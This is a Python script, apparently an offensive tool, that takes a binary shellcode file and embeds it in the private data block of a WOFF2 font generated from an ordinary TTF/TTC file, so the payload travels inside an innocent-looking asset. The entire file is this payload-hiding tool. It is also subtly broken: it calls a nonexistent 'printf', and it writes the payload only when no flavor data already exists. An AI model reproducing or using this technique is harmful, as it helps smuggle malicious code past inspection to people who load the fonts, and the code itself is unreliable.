import argparse
from fontTools.ttLib import TTFont
from fontTools.ttLib.woff2 import WOFF2FlavorData

def add_private_block(input_file, output_file, private_data):
    font = TTFont(input_file, recalcBBoxes=False, recalcTimestamp=False)

    font.flavor = 'woff2'

    if font.flavorData is None:
        font.flavorData = WOFF2FlavorData()
        font.flavorData.privData = private_data

    font.save(output_file)

    print(f"[i] Private Data Block added to {output_file}")

def main():
    parser = argparse.ArgumentParser(
            prog='shellcode_into_woff2', 
            usage='%(prog)s [options]',
            description='Generate a woff2 font file with shellcode included in the data private data block'
            )
    parser.add_argument('-i', '--input', nargs='?', help='Original ttf/ttc font file')
    parser.add_argument('-o', '--output', nargs='?', help='Woff2 font file with shellcode')
    parser.add_argument('-s', '--shellcode', nargs='?', help='bin file that contains the shellcode')
    
    args = parser.parse_args()

    if not args.input:
        print('[!] Please provide the ttf/ttc input file !')
        exit(1)
    elif not args.output:
        print('[!] Please provide the woff2 output file !')
        exit(1)
    elif not args.shellcode:
        printf('[!] Please provide the bin file that contains the shellcode !')
        exit(1)
    else:
        input_file = args.input
        output_file = args.output
        shellcode = args.shellcode
        private_data = b''

    with open(shellcode, 'rb') as f:
        private_data = f.read()

    add_private_block(input_file, output_file, private_data)

if __name__ == '__main__':
    main()
